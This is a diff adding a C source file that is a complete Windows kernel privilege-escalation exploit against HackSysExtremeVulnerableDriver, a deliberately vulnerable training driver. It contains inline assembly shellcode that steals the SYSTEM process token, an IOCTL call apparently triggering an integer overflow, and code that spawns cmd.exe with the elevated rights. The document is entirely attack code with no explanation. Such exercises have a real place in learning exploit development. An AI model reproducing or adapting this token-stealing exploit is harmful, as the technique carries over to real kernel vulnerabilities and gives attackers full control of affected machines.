@@ -1,0 +1,57 @@
+#include <windows.h>
+#include <stdio.h>
+int buf[0xf00]{};
+HANDLE hDriver;
+DWORD dwBytesOut = 0;
+static VOID ShellCode()
+{
+
+	__asm
+	{
+			int 3
+			pop edi
+			pop esi
+			pop ebx
+			pushad
+			mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
+			mov eax, [eax + 0x50]   // Find the _EPROCESS structure
+			mov ecx, eax
+			mov edx, 4				// edx = system PID(4)
+
+			// The loop is to get the _EPROCESS of the system
+			find_sys_pid :
+			mov eax, [eax + 0xb8]	// Find the process activity list
+			sub eax, 0xb8    		// List traversal
+			cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
+			jnz find_sys_pid
+
+			// Replace the Token
+			mov edx, [eax + 0xf8]
+			mov[ecx + 0xf8], edx
+			popad
+			xor eax, eax
+			pop ebp
+			add esp,12
+			retn 8
+	}
+
+}
+int main() {
+	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		return(-1);
+	}
+
+	buf[0x209] = (int)&ShellCode;
+	buf[0x210] = (int)0xBAD0B0B0;
+	//0xffffffff+4=3
+	DeviceIoControl(hDriver, 0x222027, buf, 0xffffffff, 0, 0, &dwBytesOut, NULL);
+	STARTUPINFO si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
+	return 0;
+}
